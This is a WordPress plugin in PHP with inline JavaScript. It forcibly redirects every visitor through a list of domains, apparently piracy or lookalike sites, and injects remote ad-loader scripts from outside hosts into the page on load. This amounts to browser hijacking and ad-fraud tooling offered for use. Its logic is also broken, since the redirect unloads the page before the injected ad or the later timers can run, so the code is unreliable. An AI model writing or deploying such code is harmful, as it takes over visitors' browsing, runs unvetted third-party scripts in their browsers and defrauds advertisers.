<?php
/**
 * Plugin Name: Domain Redirector with Ad Injection
 * Description: Redirects through a list of domains every 6-7 seconds and injects specific ads per domain.
 * Version: 1.1
 * Author: Your Name
 */

function enqueue_domain_redirect_and_ad_script() {
    // Define your domain groups and scripts
    $groups = [
        'group1' => [
            'domains' => ['biharbhumi.info.in', 'yojana11.com', 'niveshskill.com', 'tessofficial.com'],
            'placement' => 'footer',
            'script' => '<script data-cfasync="false" type="text/javascript" id="clever-core">/* <![CDATA[ */ (function (document, window) { var a, c = document.createElement("script"); c.id = "CleverCoreLoader98923"; c.src = "https://scripts.cleverwebserver.com/94fb25de29c41081a956ec738a8faedf.js"; c.async = !0; /* rest of the script */ })(document, window); /* ]]> */ </script>'
        ],
        'group2' => [
            'domains' => ['themovlesflix.info', 'themovlesflix.online', 'movlesflix.info', 'skybap.shop'],
            'placement' => 'head',
            'script' => '<script data-cfasync="false" type="text/javascript" id="AdsCoreLoader98327" src="https://sads.adsboosters.xyz/ba8d9dd35268014c09031a8c587cf84e.js"></script>'
        ]
        // Add more groups if needed
    ];

    // Convert PHP groups to a JavaScript-friendly format
    $groups_json = json_encode($groups);

    // Inline JavaScript for redirection and ad injection
    echo "<script type='text/javascript'>
        (function() {
            var groups = {$groups_json};
            var allDomains = [];
            var domainScripts = {};
            var currentIndex = 0;

            // Flatten the groups into domains and map scripts
            for (var key in groups) {
                var group = groups[key];
                group.domains.forEach(function(domain) {
                    allDomains.push(domain);
                    domainScripts[domain] = { script: group.script, placement: group.placement };
                });
            }

            function injectAdScript(domain) {
                var adData = domainScripts[domain];
                if (adData) {
                    var scriptHtml = adData.script;
                    if (adData.placement === 'head') {
                        document.head.insertAdjacentHTML('beforeend', scriptHtml);
                    } else if (adData.placement === 'footer') {
                        document.body.insertAdjacentHTML('beforeend', scriptHtml);
                    }
                }
            }

            function redirectToNextDomain() {
                if (currentIndex < allDomains.length) {
                    var nextDomain = allDomains[currentIndex];
                    injectAdScript(nextDomain); // Inject the ad for this domain
                    window.location.href = 'https://' + nextDomain;
                    currentIndex++;
                    setTimeout(redirectToNextDomain, Math.floor(Math.random() * 2000) + 6000); // 6 to 8 seconds
                }
            }

            // Start on page load
            window.onload = redirectToNextDomain;
        })();
    </script>";
}

add_action('wp_footer', 'enqueue_domain_redirect_and_ad_script');